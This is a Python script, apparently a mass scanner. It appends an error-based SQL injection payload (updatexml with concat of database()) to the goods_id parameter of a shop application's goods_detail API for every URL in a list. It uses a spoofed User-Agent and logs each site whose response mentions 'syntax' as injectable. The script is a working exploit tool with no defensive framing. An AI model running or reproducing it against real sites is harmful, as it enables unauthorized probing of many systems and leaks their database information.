import sys
import json
import requests
import warnings
from termcolor import cprint


urls = open('url.txt')

vunl_path = "/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)"

for i in urls:
    url = i.rstrip("\n")
    #order_id注入
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    target_url = url + vunl_path
    print(target_url)
    try:
        response = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        print("正在测试：", target_url)
        if "syntax" in response.text:
            with open('sql注入.txt', 'a')as f:
                f.write(str(target_url) + '\n')
            print("上述地址存在SQL注入")

    except Exception as e:
        print("请求失败！")
        sys.exit(0)


